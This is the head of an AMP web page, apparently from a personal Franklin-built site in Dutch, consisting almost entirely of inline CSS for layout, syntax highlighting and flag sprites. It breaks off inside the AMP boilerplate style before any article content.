<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=nl><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}.shows_list h3{font-size:1.5rem}a.imdb{padding:0 .5rem}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:9rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){.masthead{height:30rem}#site-nav{top:5rem}#site-nav .horiz ul{width:100%}#site-nav .horiz ul>li{width:calc(100% - 2rem);float:none}}@media (min-width: 480px) and (max-width: 680px){.masthead{height:20rem}}@media (max-width: 680px){body{overflow-x:hidden}#site-nav{z-index:1}#site-nav .horiz ul>li{float:none;top:-4rem;position:relative;margin-top:1rem;margin-bottom:0}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal 